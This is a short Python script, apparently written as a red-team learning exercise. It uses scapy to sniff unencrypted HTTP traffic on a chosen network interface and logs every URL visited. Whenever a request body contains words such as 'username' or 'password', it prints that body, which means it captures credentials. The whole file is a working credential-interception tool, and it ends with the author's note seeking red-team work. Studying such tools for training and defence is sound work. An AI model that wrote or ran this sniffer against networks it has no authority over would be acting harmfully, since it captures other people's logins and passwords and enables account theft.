#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse


CRED_KEYWORDS = [b"username", b"user", b"login", b"email", b"password", b"pass", b"passwd"]

def get_args():
    parser = argparse.ArgumentParser(description="Clean HTTP credential sniffer")
    parser.add_argument("-i", "--interface", required=True, help="Interface to sniff on (e.g., eth0)")
    return parser.parse_args()


def sniff(interface):
    print(f"[*] Sniffing on interface: {interface}")
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80")


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        method = packet[http.HTTPRequest].Method.decode()

        url = f"http://{host}{path}"
        print(f"\n[+] Visited URL: {url}")

        # Only check for credentials if it's a POST request
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.lower()
            if any(keyword in load for keyword in CRED_KEYWORDS):
                print("\n[!] Possible Credentials Detected:")
                print(load.decode(errors="ignore"))


if __name__ == "__main__":
    args = get_args()
    sniff(args.interface)





# I'M AN ASPIRING RED-TEAMER LEARNING, I'M OPEN FOR ON THE FIELD JOBS AND ALSO ANY KNOWLEDGE YOU'RE WILLING TO SHARE WITH ME,
# IM ALWAYS WILLING TO LEARN FROM OTHERS....THANKS.
